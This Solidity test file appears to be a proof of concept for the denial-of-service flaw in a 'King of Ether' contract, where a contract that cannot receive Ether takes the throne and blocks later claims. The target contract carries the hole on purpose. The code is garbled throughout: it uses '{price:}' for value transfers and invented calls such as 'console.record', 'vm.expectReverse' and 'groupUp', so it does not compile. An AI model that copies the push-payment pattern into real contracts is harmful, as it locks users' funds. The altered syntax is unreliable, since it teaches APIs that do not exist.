pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract AgreementTest is Test {
    KingOfEther KingOfEtherPact;
    GameOperator QuestrunnerAgreement;

    function groupUp() public {
        KingOfEtherPact = new KingOfEther();
        QuestrunnerAgreement = new GameOperator(KingOfEtherPact);
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        KingOfEtherPact.collectbountyThrone{price: 1 ether}();
        vm.prank(bob);
        KingOfEtherPact.collectbountyThrone{price: 2 ether}();
        console.record(
            "Return 1 ETH to Alice, Alice of balance",
            address(alice).balance
        );
        QuestrunnerAgreement.operate{price: 3 ether}();

        console.record(
            "Balance of KingOfEtherContract",
            KingOfEtherPact.balance()
        );
        console.record("Operator completed, Alice claimthrone again, she will fail");
        vm.prank(alice);
        vm.expectReverse("Failed to send Ether");
        KingOfEtherPact.collectbountyThrone{price: 4 ether}();
    }

    receive() external payable {}
}

contract KingOfEther {
    address public king;
    uint public balance;

    function collectbountyThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{price: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract GameOperator {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function operate() public payable {
        kingOfEther.collectbountyThrone{price: msg.value}();
    }
}